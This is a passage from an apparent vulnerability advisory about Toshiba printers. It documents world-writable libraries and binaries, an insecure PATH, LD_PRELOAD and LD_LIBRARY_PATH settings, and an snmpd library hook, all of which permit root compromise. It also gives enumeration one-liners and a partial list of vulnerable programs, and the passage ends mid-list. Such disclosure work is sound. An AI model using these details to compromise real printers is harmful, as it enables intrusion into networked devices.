root      1874  0.0  0.5  61692 15364 ?        Sl   16:34   0:00 ./alsecurityconfiguration
root      1875  0.0  0.3  41408 11008 ?        S    16:34   0:00 ./alintegritychkmgr
root      1876  0.3  3.6 482584 108060 ?       Sl   16:34   0:43 ./alUiFrameWork legacy -S ramdisk
root      1877  0.0  0.9  92276 26968 ?        Sl   16:34   0:01 ./alpanel panel 49 Controller/Settings/autoClear Controller/Information/Locale -T4
root      1878  0.0  0.4  60888 14588 ?        S    16:34   0:00 ./aljobtemplatemgr
root      1879  0.0  0.3  42492 11204 ?        S    16:34   0:00 ./alLogRetriever -T8
root      1880  0.0  0.4  49340 14248 ?        S    16:34   0:00 ./alExportImport -T8
root      1881  0.0  0.4  57852 14596 ?        S    16:34   0:00 ./aleFilingmgr -T8
root      1882  0.0  0.4  60244 13020 ?        Sl   16:34   0:00 ./alpresentationresourcemgr -T8
root      1883  0.0  0.2  35036  8340 ?        S    16:34   0:00 ./alServiceUIPlugin
root      1884  0.0  0.3  45624 10220 ?        Sl   16:34   0:00 ./alPanelUIMessageHandler -S ramdisk
root      1885  0.0  0.3  42016 11916 ?        S    16:34   0:00 ./alusbmscapplication
root      1886  0.0  0.4  70124 12236 ?        Sl   16:34   0:00 ./alViewPlugin
root      1887  0.0  0.4  83200 12652 ?        Sl   16:34   0:00 ./alsharedprintDp -T8
root      1888  0.0  0.7  62028 22420 ?        S    16:34   0:06 ./alnsm -d9 -m00 -T5
root      1890  0.0  0.5 128920 16292 ?        Sl   16:34   0:00 ./aljobcontroller -T8
root      1891  0.0  0.4 118216 12728 ?        Sl   16:34   0:00 ./alprintmn -T8
root      1892  0.0  0.3  49888 11220 ?        Sl   16:34   0:00 ./alreportsmsgr
root      1893  0.0  0.5  72764 17720 ?        Sl   16:34   0:00 ./alreportmanager
root      1922  0.0  0.3  46056 11236 ?        S    16:34   0:00 ./almailboxapplication
root      1923  0.0  0.4  44204 13528 ?        S    16:34   0:00 ./alsoftwareupdateclient -T8
root      1974  0.0  0.5  56496 15560 ?        S    16:34   0:00 ./alifaxreceive -T8
root      1975  0.0  0.4  47184 14844 ?        S    16:34   0:00 ./almaintenanceplugin -T6
root      1976  0.0  0.3  41416 11312 ?        S    16:34   0:00 ./alpdlfiltermanager
root      1977  0.0  0.4  51736 14524 ?        S    16:34   0:00 ./alCloning -T8
root      1978  0.0  0.3  43528  9412 ?        Sl   16:34   0:00 ./alPanelStartLEDHandler
root      1979  0.0  0.3  39964 11504 ?        S    16:34   0:00 ./alhomedatamgr
root      1980  0.0  0.6  47532 18748 ?        S    16:34   0:00 ./sim -T8
root      1981  0.0  0.7  92856 23600 ?        Sl   16:34   0:01 ./informationservice -T8
root      1982  0.0  0.2  34624  8476 ?        S    16:34   0:00 ./sljobmanagement -T8
root      1985  0.0  0.7  59792 22588 ?        Sl   16:34   0:00 ./notificationservice 1284 -T8
root      1986  0.0  0.9  87936 28716 ?        Sl   16:34   0:03 ./wfpc -T8
root      1987  0.0  0.3  35524  9156 ?        S    16:34   0:00 ./armn -T8
root      2205  0.0  0.4  59596 12808 ?        Ss   16:35   0:00 ./wfpc -T8
root      2208  0.0  0.3  59144 11220 ?        Ss   16:35   0:00 ./wfpc -T8
root      2327  0.0  0.4  55020 13452 ?        S    16:35   0:00 ./alAddressBookMgr
root      2328  0.0  0.5  72396 15208 ?        Sl   16:35   0:00 ./alaccountmgr
root      2426  0.0  0.3  46192 10496 ?        Sl   16:35   0:00 ./agent_scan 1282 1 -T8
root      2428  0.0  0.3  44272  9844 ?        Sl   16:35   0:00 ./agent_faxreceive 1282 2 -T8
root      2430  0.0  0.6 450116 19668 ?        Sl   16:35   0:00 ./agent_rip 1282 6 -T8
root      2432  0.0  0.3  47100 10260 ?        Sl   16:35   0:00 ./agent_print 1282 15 -T8
root      2433  0.0  0.3  44316  9816 ?        Sl   16:35   0:00 ./agent_faxtransmit 1282 16 -T8
root      2434  0.0  0.3  44296  9800 ?        Sl   16:35   0:00 ./agent_ipfaxtransmit 1282 31 -T8
root      2435  0.0  0.3  44268  9796 ?        Sl   16:35   0:00 ./agent_ipfaxreceive 1282 32 -T8
root      2515  0.0  0.4  54636 13444 ?        Sl   16:35   0:00 ./alulm
root      2516  0.0  0.3 249732  9260 ?        Sl   16:35   0:00 ./alcbamanager -S ramdisk
root      2614  0.0  0.5 183976 17564 ?        Sl   16:35   0:00 ./alappmanager
root      2870  0.0  0.4  54968 14848 ?        Sl   16:35   0:00 ./alLogmanager
root      2871  0.0  0.4  46088 13440 ?        S    16:35   0:00 ./alhddbackuprestore
[...]
root      3784  0.0  0.4  45704 12760 ?        S    16:35   0:00 /home/SYSROM_SRC/build/release/bin/alftpprintd
root      3828  0.0  0.0  15516  2424 ?        S    16:35   0:00 /home/SYSROM_SRC/build/release/bin/vsftpd -enableprinting
root      3860  0.1  2.3 201372 70908 ?        Sl   16:35   0:25 python /home/SYSROM_SRC/build/release/bin/sapphost.py 10000000-0000-0000-0000-500000000000
root      3935  0.0  0.4 218132 13644 ?        Sl   16:35   0:00 /home/SYSROM_SRC/build/release/bin/alhp9100 -f /encryption/al/network/config/hp9100.conf
root      3970  0.1  1.6 144908 48860 ?        Sl   16:35   0:24 python /home/SYSROM_SRC/build/release/bin/sapphost.py 10000000-0000-0000-0000-500000000001
root      3992  0.0  0.2  33948  8128 ?        S    16:35   0:00 /home/SYSROM_SRC/build/release/bin/snmp_watchdog
root      4025  0.0  0.2  34236  8920 ?        S    16:35   0:00 /home/SYSROM_SRC/bin/dnsValidateDaemon
[...]
</code></pre>
<p>The printer does not implement separation of privileges.</p>
<p>A vulnerability found inside one of the multiple components in the printer is enough to completely compromise the security of printer. </p>
<p><a id="lpe-rce-snmpd"></a></p>
<h2>Details - Local Privilege Escalation and Remote Code Execution using snmpd</h2>
<p>Toshiba printers are vulnerable to a Local Privilege Escalation vulnerability because of an insecure library defined inside the configuration of snmpd. This Local Privilege Escalation can be also exploited as a Remote Code Execution by uploading a malicious library.</p>
<p>The snmpd configuration file located at <code>/encryption/al/network/config/snmpd.conf</code> contains the loading of an external and Toshiba-specific library. The code contained inside this library will be executed as root (as snmpd is running as root).</p>
<p>Content of <code>/encryption/al/network/config/snmpd.conf</code>:</p>
<pre><code>dlmod  mibs_impl                        /home/SYSROM_SRC/lib/libalmibs_impl.so
</code></pre>
<p>This file is a symbolic link to the <code>/home/SYSROM_SRC/lib/libalmibs_impl.so.0</code> library.</p>
<p>The <code>/home/SYSROM_SRC/lib/libalmibs_impl.so.0</code> file has incorrect permissions, allowing any local attacker or any remote attacker exploiting the <a href="#pre-auth-rces-upload">Pre-authenticated Remote Code Execution as root or apache and multiple Local Privilege Escalations</a> vulnerability to replace this file with a malicious library.</p>
<pre>
bash-4.1# ls -la /home/SYSROM_SRC/lib/libalmibs_impl.so*
lrwxrwxrwx 1 root root      19 Mar 14 16:27 /home/SYSROM_SRC/lib/libalmibs_impl.so -> libalmibs_impl.so.0
<font color=red>-rwxrwxrwx</font> 1 root root 5239499 Dec  6 03:28 /home/SYSROM_SRC/lib/libalmibs_impl.so.0
bash-4.1#
</pre>

<p>This file will be loaded when snmpd starts. The snmpd program starts during the boot of the printer and is automatically restarted when it crashes.</p>
<p>It is possible to crash the remote snmpd server using the <a href="#pre-auth-rce-snmp">Pre-authenticated Remote Code Execution as root</a> vulnerability to force the restart of the snmpd daemon, load the malicious library and compromise the printer.</p>
<p>An attacker can remotely compromise any Toshiba printer.</p>
<p><a id="lpe-rce-path"></a></p>
<h2>Details - Local Privilege Escalation and Remote Code Execution using insecure PATH</h2>
<p>Toshiba printers are vulnerable to a Local Privilege Escalation vulnerability because of an insecure PATH variable. This Local Privilege Escalation can be also exploited as a Remote Code Execution by uploading a malicious program using the <a href="#pre-auth-rces-upload">Pre-authenticated Remote Code Execution as root or apache and multiple Local Privilege Escalations</a> vulnerability.</p>
<p>It was observed that the Toshiba printers are configured with an insecure <code>$PATH</code> variable:</p>
<pre>
bash-4.1# echo $PATH
<font color=red>/home/SYSROM_SRC/build/release/bin:/home/SYSROM_SRC/build/release/sbin:/home/SYSROM_SRC/build/release/bin:
/home/SYSROM_SRC/build/release/sbin:/home/SYSROM_SRC/build/release/bin:/home/SYSROM_SRC/build/release/sbin</font>:
/bin:/usr/bin:/sbin:/usr/sbin:/sbin:/bin/:/usr/bin/:/usr/sbin:/sbin:/bin/:/usr/bin/:/usr/sbin:/sbin:/bin/:/usr/bin/:/usr/sbin
bash-4.1#
</pre>

<p>The <code>$PATH</code> variable contains several directories with insecure permissions (777) allowing any attacker to plant malicious programs that will be then executed instead of regular programs:</p>
<ul>
<li><code>/home/SYSROM_SRC/build/release/bin</code></li>
<li><code>/home/SYSROM_SRC/build/release/sbin</code></li>
</ul>
<p>These 2 directories are specified multiple times and are configured with the 777 permissions:</p>
<p>Insecure permissions of <code>/home/SYSROM_SRC/build/release/bin</code> and <code>/home/SYSROM_SRC/build/release</code>:</p>
<pre>
bash-4.1# ls -la /home/SYSROM_SRC/bin
lrwxrwxrwx 1 root trusted 17 Mar 14 16:34 /home/SYSROM_SRC/bin -> build/release/bin
bash-4.1# ls -la /home/SYSROM_SRC/build/release/bin
total 176508
<font color=red>drwxrwxrwx  2 root root       36864 Mar 15 16:12 .
drwxrwxrwx 19 root root        4096 Mar 14 16:28 ..</font>
lrwxrwxrwx  1 root root          25 Mar 14 16:27 2to3 -> ../../thirdparty/bin/2to3
lrwxrwxrwx  1 root root          29 Mar 14 16:27 2to3-3.5 -> ../../thirdparty/bin/2to3-3.5
-rwxrwxrwx  1 root root      120381 Dec  6 01:56 ALABAMA_Large.ico
-rwxrwxrwx  1 root root       25214 Dec  6 01:56 ALABAMA_Small.ico
-rwxrwxrwx  1 root root      143884 Dec  6 01:56 ALABAMA_f_Large.ico
-rwxrwxrwx  1 root root       25214 Dec  6 01:56 ALABAMA_f_Small.ico
lrwxrwxrwx  1 root root          39 Mar 14 16:27 AppLicenseDataBase -> ../../thirdparty/bin/AppLicenseDataBase
...
</pre>

<p>Insecure permissions of <code>/home/SYSROM_SRC/build/release/sbin</code> and <code>/home/SYSROM_SRC/build/release</code>:</p>
<pre>
bash-4.1# ls -la /home/SYSROM_SRC/sbin
lrwxrwxrwx 1 root root 18 Mar 14 16:34 /home/SYSROM_SRC/sbin -> build/release/sbin
bash-4.1# ls -la /home/SYSROM_SRC/build/release/sbin
total 608
<font color=red>drwxrwxrwx  2 root root  4096 Dec  6 01:40 .
drwxrwxrwx 19 root root  4096 Mar 14 16:28 ..</font>
-rwxrwxrwx  1 root root  4467 Dec  6 01:40 CheckAndRemovePerms.sh
lrwxrwxrwx  1 root root    26 Mar 14 16:27 afpd -> ../../thirdparty/sbin/afpd
lrwxrwxrwx  1 root root    30 Mar 14 16:27 arpaname -> ../../thirdparty/sbin/arpaname
lrwxrwxrwx  1 root root    28 Mar 14 16:27 atalkd -> ../../thirdparty/sbin/atalkd
lrwxrwxrwx  1 root root    30 Mar 14 16:27 cnid_dbd -> ../../thirdparty/sbin/cnid_dbd
lrwxrwxrwx  1 root root    32 Mar 14 16:27 cnid_metad -> ../../thirdparty/sbin/cnid_metad
lrwxrwxrwx  1 root root    34 Mar 14 16:27 ddns-confgen -> ../../thirdparty/sbin/ddns-confgen
...
</pre>

<p>On a side note, the <code>/home/SYSROM_SRC</code> directory is highly insecure with incorrect permissions used everywhere:</p>
<pre>
bash-4.1# ls -la /home/SYSROM_SRC
total 52
drwxr-xr-x 9 root root    4096 Mar 14 16:34 .
drwxr-xr-x 4 root root    4096 Mar 14 16:28 ..
lrwxrwxrwx 1 root root      30 Mar 14 16:28 CBAHttpServer -> /registration/al/CBAHttpServer
lrwxrwxrwx 1 root root      20 Mar 14 16:27 HDBROOT -> /home/SYSROM_SRC/tmp
<font color=red>drwxrwxrwx 7 root root    4096 Dec  6 00:46 NoBuildItems</font>
lrwxrwxrwx 1 root root      28 Mar 14 16:28 Resources -> /registration/data/Resources
lrwxrwxrwx 1 root root      32 Mar 14 16:28 Resources_eBN -> /registration/data/Resources_eBN
-rwxr-xr-x 1 root root    5614 Mar 14 16:28 Startup.sh
lrwxrwxrwx 1 root root      40 Apr  6  2016 TopAccess -> /home/SYSROM_SRC/build/release/TopAccess
lrwxrwxrwx 1 root root      28 Mar 14 16:28 TopAccessPy -> /registration/al/TopAccessPy
lrwxrwxrwx 1 root root      23 Mar 14 16:28 WebAPI -> /registration/al/WebAPI
lrwxrwxrwx 1 root root      25 Mar 14 16:28 WebPanel -> /registration/al/WebPanel
lrwxrwxrwx 1 root trusted   17 Mar 14 16:34 bin -> build/release/bin
drwxr-xr-x 5 root root    4096 Apr  6  2016 build
<font color=red>drwxrwxrwx 2 root root    4096 Dec  6 01:13 config
drwxrwxrwx 3 root root    4096 Mar 14 16:28 data</font>
lrwxrwxrwx 1 root root      17 Mar 14 16:34 etc -> build/release/etc
-rwxr-xr-x 1 root root    1075 Mar 14 16:27 install_rip_ram.sh
<font color=red>drwxrwxrwx 4 root root    4096 Mar 14 16:34 jobdata</font>
lrwxrwxrwx 1 root trusted   17 Mar 14 16:34 lib -> build/release/lib
<font color=red>drwxrwxrwx 2 root root    4096 Dec  6 04:48 logs</font>
lrwxrwxrwx 1 root root      18 Mar 14 16:34 sbin -> build/release/sbin
<font color=red>-rwxrwxrwx 1 root root    3492 Dec  8  2017 setenv</font>
lrwxrwxrwx 1 root root      19 Mar 14 16:34 share -> build/release/share
drwxr-xr-x 3 root root    4096 Dec  6 04:48 var
bash-4.1#
</pre>

<p>An attacker can place any malicious program inside <code>/home/SYSROM_SRC/build/release/bin</code> or <code>/home/SYSROM_SRC/build/release/sbin</code> and they will be executed before legit programs that are stored in the regular UNIX directories (<code>/bin</code>, <code>/usr/bin</code>, <code>/sbin</code>, <code>/usr/sbin</code>).</p>
<p>An attacker can remotely compromise any Toshiba printer.</p>
<p><a id="lpe-rce-ld-preload"></a></p>
<h2>Details - Local Privilege Escalation and Remote Code Execution using insecure LD_PRELOAD</h2>
<p>Toshiba printers are vulnerable to a Local Privilege Escalation vulnerability because of an insecure LD_PRELOAD variable. This Local Privilege Escalation can be also exploited as a Remote Code Execution by uploading a malicious library using the <a href="#pre-auth-rces-upload">Pre-authenticated Remote Code Execution as root or apache and multiple Local Privilege Escalations</a> vulnerability.</p>
<p>Toshiba printers are configured with an insecure <code>LD_PRELOAD</code> variable:</p>
<pre><code>bash-4.1# printenv | grep LD_PRELOAD
LD_PRELOAD=/ramdisk/al/libGetNameInfoInterface.so:/ramdisk/al/libGetAddtInfoInterface.so:
bash-4.1#
</code></pre>
<p>The <code>$LD_PRELOAD</code> variable contains 2 libraries with insecure permissions (777) allowing any attacker to replace these libraries with malicious libraries that will be then executed:</p>
<ul>
<li><code>/ramdisk/al/libGetNameInfoInterface.so</code></li>
<li><code>/ramdisk/al/libGetAddtInfoInterface.so</code></li>
</ul>
<p>Checking the permissions of libraries defined in LD_PRELOAD:</p>
<pre>
bash-4.1# ls -la /ramdisk/al/libGetNameInfoInterface.so
<font color=red>-rwxrwxrwx 1 root root 70813 Dec  6 02:02 /ramdisk/al/libGetNameInfoInterface.so</font>
bash-4.1# s -la /ramdisk/al/libGetAddtInfoInterface.so
<font color=red>-rwxrwxrwx 1 root root 87311 Dec  6 02:02 /ramdisk/al/libGetAddtInfoInterface.so</font>
bash-4.1#
</pre>

<p>We can confirm these 2 libraries are loaded within programs inside the printers.</p>
<p>Using <code>/proc/$PID/maps</code>, we can list the libraries loaded inside the programs: these libraries are loaded inside all the programs running as root and apache in the printers:</p>
<pre><code>bash-4.1# cd /proc &amp;&amp; for i in */; do cat $i/cmdline &amp;&amp; echo &amp;&amp; grep ramdisk $i/maps;done
/home/SYSROM_SRC/build/release/bin/nqnd
77788000-77797000 r-xp 00000000 00:0d 10712      /ramdisk/al/libGetAddtInfoInterface.so
77797000-77799000 rw-p 0000e000 00:0d 10712      /ramdisk/al/libGetAddtInfoInterface.so
77799000-777a4000 r-xp 00000000 00:0d 7014       /ramdisk/al/libGetNameInfoInterface.so
777a4000-777a6000 rw-p 0000a000 00:0d 7014       /ramdisk/al/libGetNameInfoInterface.so
/home/SYSROM_SRC/build/release/bin/nqcs
7776d000-7777c000 r-xp 00000000 00:0d 10712      /ramdisk/al/libGetAddtInfoInterface.so
7777c000-7777e000 rw-p 0000e000 00:0d 10712      /ramdisk/al/libGetAddtInfoInterface.so
7777e000-77789000 r-xp 00000000 00:0d 7014       /ramdisk/al/libGetNameInfoInterface.so
77789000-7778b000 rw-p 0000a000 00:0d 7014       /ramdisk/al/libGetNameInfoInterface.so
[...]
/usr/local/ebx/bin/httpd -f /encryption/al/network/config/httpd.conf -k start
777b5000-777c4000 r-xp 00000000 00:0d 10712      /ramdisk/al/libGetAddtInfoInterface.so
777c4000-777c6000 rw-p 0000e000 00:0d 10712      /ramdisk/al/libGetAddtInfoInterface.so
777c7000-777d2000 r-xp 00000000 00:0d 7014       /ramdisk/al/libGetNameInfoInterface.so
777d2000-777d4000 rw-p 0000a000 00:0d 7014       /ramdisk/al/libGetNameInfoInterface.so
/usr/local/ebx/bin/httpd -f /encryption/al/network/config/httpd.conf -k start
777b5000-777c4000 r-xp 00000000 00:0d 10712      /ramdisk/al/libGetAddtInfoInterface.so
777c4000-777c6000 rw-p 0000e000 00:0d 10712      /ramdisk/al/libGetAddtInfoInterface.so
777c7000-777d2000 r-xp 00000000 00:0d 7014       /ramdisk/al/libGetNameInfoInterface.so
777d2000-777d4000 rw-p 0000a000 00:0d 7014       /ramdisk/al/libGetNameInfoInterface.so
[...]
./alusermgr
776f6000-77705000 r-xp 00000000 00:0d 10712      /ramdisk/al/libGetAddtInfoInterface.so
77705000-77707000 rw-p 0000e000 00:0d 10712      /ramdisk/al/libGetAddtInfoInterface.so
77707000-77712000 r-xp 00000000 00:0d 7014       /ramdisk/al/libGetNameInfoInterface.so
77712000-77714000 rw-p 0000a000 00:0d 7014       /ramdisk/al/libGetNameInfoInterface.so
./allicensemgmt
777dc000-777eb000 r-xp 00000000 00:0d 10712      /ramdisk/al/libGetAddtInfoInterface.so
777eb000-777ed000 rw-p 0000e000 00:0d 10712      /ramdisk/al/libGetAddtInfoInterface.so
777ed000-777f8000 r-xp 00000000 00:0d 7014       /ramdisk/al/libGetNameInfoInterface.so
777f8000-777fa000 rw-p 0000a000 00:0d 7014       /ramdisk/al/libGetNameInfoInterface.so
[...]
</code></pre>
<p>An attacker can remotely compromise any Toshiba printer.</p>
<p><a id="lpe-rce-ld-library-path"></a></p>
<h2>Details - Local Privilege Escalation and Remote Code Execution using insecure LD_LIBRARY_PATH</h2>
<p>Toshiba printers are vulnerable to a Local Privilege Escalation vulnerability because of an insecure LD_LIBRARY_PATH variable. This Local Privilege Escalation can be also exploited as a Remote Code Execution by uploading a malicious library using the <a href="#pre-auth-rces-upload">Pre-authenticated Remote Code Execution as root or apache and multiple Local Privilege Escalations</a> vulnerability.</p>
<p>Toshiba printers are configured with an insecure <code>$LD_LIBRARY_PATH</code> variable:</p>
<pre><code>bash-4.1# printenv|grep LD_LIBRARY_PATH
LD_LIBRARY_PATH=/home/SYSROM_SRC/build/release/lib:/mfp/lib:/home/SYSROM_SRC/NoBuildItems/common/lib:/home/SYSROM_SRC/build/thirdparty//plugins//platforminputcontexts/:/home/SYSROM_SRC/build/release/lib
bash-4.1#
</code></pre>
<p>The <code>$LD_LIBRARY_PATH</code> variable contains 4 directories insecure permissions (777) allowing any attacker to replace these libraries with malicious libraries that will be then executed:</p>
<ul>
<li><code>/home/SYSROM_SRC/build/release/lib</code></li>
<li><code>/mfp/lib</code></li>
<li><code>/home/SYSROM_SRC/NoBuildItems/common/lib</code></li>
<li><code>/home/SYSROM_SRC/build/thirdparty//plugins//platforminputcontexts/</code></li>
</ul>
<p>We can confirm these directories have insecure permissions and/or the files stored inside these directories have insecure permissions as shown below:</p>
<p>Insecure permissions of <code>/home/SYSROM_SRC/build/release/lib</code>:</p>
<pre>
bash-4.1# ls -la /home/SYSROM_SRC/build/release/lib 
total 391144
<font color=red>drwxrwxrwx  4 root root    65536 May 27 16:28 .</font>
drwxrwxrwx 19 root root     4096 May 27 16:28 ..
lrwxrwxrwx  1 root root       38 Apr  6  2016 ImageMagick-6.3.3 -> ../../thirdparty/lib/ImageMagick-6.3.3
lrwxrwxrwx  1 root root       38 Mar 14 16:27 ImageMagick-6.7.5 -> ../../thirdparty/lib/ImageMagick-6.7.5
lrwxrwxrwx  1 root root       15 Mar 14 16:27 al8021XNMO.so -> al8021XNMO.so.0
-rwxrwxrwx  1 root root   223011 Dec  6 01:58 al8021XNMO.so.0
lrwxrwxrwx  1 root root       14 Mar 14 16:27 alDDNSNMO.so -> alDDNSNMO.so.0
-rwxrwxrwx  1 root root   171442 Dec  6 01:59 alDDNSNMO.so.0
lrwxrwxrwx  1 root root       13 Mar 14 16:27 alDNSNMO.so -> alDNSNMO.so.0
[...]
</pre>

<p>Insecure permissions of <code>/mfp/lib</code>:</p>
<pre>
bash-4.1# ls -la /mfp/lib 
total 344308
drwxr-xr-x 2 root   root          12288 May 27 16:28 .
drwxr-xr-x 8 root   root           4096 May 27 16:28 ..
<font color=red>-rwxrwxrwx 1 root   root             75 Jan 11  2013 DirectoryCopy.txt
-rwxrwxrwx 1 root   root            203 Jun 29  2017 SharedFiles.ini
-rwxrwxrwx 1 root   root        6210326 Jun  9  2022 laser.so
-rwxrwxrwx 1 root   root       11386849 Jun  9  2022 laserc1x.so
-rwxrwxrwx 1 root   root         298388 Dec 17  2017 libAbbyyZlib.so
-rwxrwxrwx 1 root   root        1518996 Dec 17  2017 libBarcode.so
-rwxrwxrwx 1 root   root        1045032 Dec 17  2017 libBusinessCard.Analyser.so
[...]</font>
</pre>

<p>Insecure permissions of <code>/home/SYSROM_SRC/NoBuildItems/common/lib</code>:</p>
<pre>
bash-4.1# ls -la /home/SYSROM_SRC/NoBuildItems/common/lib 
total 49580
<font color=red>drwxrwxrwx 2 root root     4096 May 27 16:27 .</font>
drwxrwxrwx 4 root root     4096 Dec  6 00:21 ..
-rwxrwxrwx 1 root root   624082 Dec  6 04:53 libCryptolib.so
-rwxrwxrwx 1 root root   624082 Dec  6 04:53 libCryptolib.so.0
-rwxrwxrwx 1 root root   624082 Apr 20  2018 libCryptolib.so.0.0.0
-rwxrwxrwx 1 root root 22366570 Jun  4  2018 libFREmbed.so
lrwxrwxrwx 1 root root       14 Mar 14 16:27 libasicif.so -> libasicif.so.1
lrwxrwxrwx 1 root root       16 Mar 14 16:27 libasicif.so.1 -> libasicif.so.1.0
-rwxrwxrwx 1 root root    12649 Apr  2  2016 libasicif.so.1.0
[...]
</pre>

<p>Insecure permissions of <code>/home/SYSROM_SRC/build/thirdparty//plugins//platforminputcontexts/</code>:</p>
<pre>
bash-4.1# ls -la /home/SYSROM_SRC/build/thirdparty//plugins//platforminputcontexts/ 
total 13036
<font color=red>drwxrwxrwx  2 510 510     4096 Sep 13  2019 .</font>
drwxrwxrwx 18 510 510     4096 Sep 13  2019 ..
-rwxrwxrwx  1 510 510    84844 Aug 25  2016 libibusplatforminputcontextplugin.so
-rwxrwxrwx  1 510 510 13252081 Sep 13  2019 libscreenkeyboardplugin.so
bash-4.1#
</pre>

<p><u>On a side note, all the libraries have also insecure permissions in the previous listing.</u></p>
<p>An attacker can remotely compromise any Toshiba printer.</p>
<p><a id="lpe-rce-106-programs"></a></p>
<h2>Details - Local Privilege Escalation and Remote Code Execution using insecure permissions for 106 programs</h2>
<p>Some vendor-specific programs are running inside Toshiba printers. These programs run as root and have insecure permissions (777) allowing an attacker to replace these programs with malicious programs. This Local Privilege Escalation can be also exploited as a Remote Code Execution by uploading a malicious program using the <a href="#pre-auth-rces-upload">Pre-authenticated Remote Code Execution as root or apache and multiple Local Privilege Escalations</a> vulnerability.</p>
<p>Some programs are running as root, for example:</p>
<pre><code>bash-4.1# ps auxw | grep root
root      1448  0.0  0.7 143680 21860 ?        Sl   16:34   0:00 /home/SYSROM_SRC/build/release/bin/slapd -h ldap://127.0.0.1 -f /home/SYSROM_SRC/build/release/etc/openldap/slapd.conf -d 1
root      1460  0.0  0.2 387308  8036 ?        Sl   16:34   0:02 /home/SYSROM_SRC/bin/mapper firstboot=0
[...]
root      1487  0.0  0.3  53496 10184 ?        Sl   16:34   0:02 ./cissm -T 7 -d ssm.xml
root      1647  0.0  0.3  67568  9256 ?        Sl   16:34   0:02 ./cischeduler -S ramdisk
root      1648  0.0  0.3  49452 11852 ?        Sl   16:34   0:00 ./cisystemresourcemanager -T8
root      1650  0.0  0.3  50320 11112 ?        S    16:34   0:00 ./pipeMN -T8
root      1652  0.0  0.3  47372 10708 ?        S    16:34   0:00 ./cpe -T8
root      1653  0.0  0.2  35524  8888 ?        S    16:34   0:00 ./dem -T8
root      1654  0.0  0.4  53448 12588 ?        S    16:34   0:00 ./dim -T8
root      1655  0.1  0.4  96460 12128 ?        Sl   16:34   0:18 ./alboserver -T5
[...]
</code></pre>
<p>Using this one-liner, it is possible to list the file corresponding to programs running inside the printers:</p>
<p>Programs running as root:</p>
<pre><code>bash-4.1# for i in $(ps auxww | grep root | awk '{ print $11 }' | grep -v '^\[' | grep -v COMMAND | grep -v '(' | grep -v ':$' | grep -v 'supervising' | sort | uniq); do ls -la $(which "$(echo $i | sed -e 's#^\./##')");done
</code></pre>
<p>Running with a different user:</p>
<pre><code>for i in $(ps auxww | grep -v root | awk '{ print $11 }' | grep -v '^\[' | grep -v COMMAND | grep -v '(' | grep -v ':$' | grep -v 'supervising' | sort | uniq); do ls -la $(which "$(echo $i | sed -e 's#^\./##')");done
</code></pre>
<p>These commands allow to list 106 vulnerable programs found inside the printers.</p>
<p><a id="lpe-rce-3-programs"></a></p>
<h3>3 vulnerable programs not running as root</h3>
<p>3 programs have been identified as vulnerable (running with a low-privileged user and that can be overwritten by any local or remote attacker):</p>
<ul>
<li>/home/SYSROM_SRC/thirdparty/sbin/slpd</li>
<li>/usr/local/ebx/bin/httpd</li>
<li>/usr/local/ebx/httpd_worker/bin/httpd_worker</li>
</ul>
<p>Vulnerable programs not running as root:</p>
<pre><code>bash-4.1# for i in $(ps auxww | grep -v root | awk '{ print $11 }' | grep -v '^\[' | grep -v COMMAND | grep -v '(' | grep -v ':$' | grep -v 'supervising' | sort | uniq); do ls -la $(which "$(echo $i | sed -e 's#^\./##')");done

lrwxrwxrwx 1 root root 26 Mar 14 16:27 /home/SYSROM_SRC/bin/slpd -&gt; ../../thirdparty/sbin/slpd
-rwxrwxrwx 1 apache messagebus 656546 Dec  6 01:34 /usr/local/ebx/bin/httpd
-rwxrwxrwx 1 apache messagebus 665612 Dec  6 01:34 /usr/local/ebx/httpd_worker/bin/httpd_worker
bash-4.1#
</code></pre>
<p>When following the link to slpd, we can confirm it is also vulnerable:</p>
<pre><code>bash-4.1# ls -la /home/SYSROM_SRC/build/thirdparty/sbin/slpd
-rwxrwxrwx 1 root root 106023 Dec  6 01:27 /home/SYSROM_SRC/build/thirdparty/sbin/slpd
bash-4.1#
</code></pre>
<p><a id="lpe-rce-103-programs"></a></p>
<h3>103 vulnerable programs running as root</h3>
<p>103 programs have been identified as vulnerable (running as root and that can be overwritten by any local or remote attacker):</p>
<ul>
<li>/home/SYSROM_SRC/bin/alllmnr</li>
<li>/home/SYSROM_SRC/bin/dnsValidateDaemon</li>
<li>/home/SYSROM_SRC/bin/eBXDebugLogUtility</li>
<li>/home/SYSROM_SRC/bin/ipv6_daemon</li>
<li>/home/SYSROM_SRC/bin/mapper</li>
<li>/home/SYSROM_SRC/bin/syscallerr</li>
<li>/home/SYSROM_SRC/build/release/bin/agent_faxreceive</li>
<li>/home/SYSROM_SRC/build/release/bin/agent_faxtransmit</li>
<li>/home/SYSROM_SRC/build/release/bin/agent_ipfaxreceive</li>
<li>/home/SYSROM_SRC/build/release/bin/agent_ipfaxtransmit</li>
<li>/home/SYSROM_SRC/build/release/bin/agent_print</li>
<li>/home/SYSROM_SRC/build/release/bin/agent_rip</li>
<li>/home/SYSROM_SRC/build/release/bin/agent_scan</li>
<li>/home/SYSROM_SRC/build/release/bin/alaccountmgr</li>
<li>/home/SYSROM_SRC/build/release/bin/alAddressBookMgr</li>
<li>/home/SYSROM_SRC/build/release/bin/alappmanager</li>
<li>/home/SYSROM_SRC/build/release/bin/alboserver</li>
<li>/home/SYSROM_SRC/build/release/bin/alcbamanager</li>
<li>/home/SYSROM_SRC/build/release/bin/alCloning</li>
<li>/home/SYSROM_SRC/build/release/bin/aldevauthmgmtplugin</li>
<li>/home/SYSROM_SRC/build/release/bin/aldeviceconfigplugin</li>
<li>/home/SYSROM_SRC/build/release/bin/aldeviceserviceplugin</li>
<li>/home/SYSROM_SRC/build/release/bin/aleFilingmgr</li>
<li>/home/SYSROM_SRC/build/release/bin/aleSCL</li>
<li>/home/SYSROM_SRC/build/release/bin/alExportImport</li>
<li>/home/SYSROM_SRC/build/release/bin/alfilestoragem</li>
<li>/home/SYSROM_SRC/build/release/bin/alftpprintd</li>
<li>/home/SYSROM_SRC/build/release/bin/algrpmgr</li>
<li>/home/SYSROM_SRC/build/release/bin/alhddalertmgr</li>
<li>/home/SYSROM_SRC/build/release/bin/alhddbackuprestore</li>
<li>/home/SYSROM_SRC/build/release/bin/alhomedatamgr</li>
<li>/home/SYSROM_SRC/build/release/bin/alhp9100</li>
<li>/home/SYSROM_SRC/build/release/bin/alifaxreceive</li>
<li>/home/SYSROM_SRC/build/release/bin/alintegritychkmgr</li>
<li>/home/SYSROM_SRC/build/release/bin/aljobcontroller</li>
<li>/home/SYSROM_SRC/build/release/bin/aljobtemplatemgr</li>
<li>/home/SYSROM_SRC/build/release/bin/allicensemgmt</li>
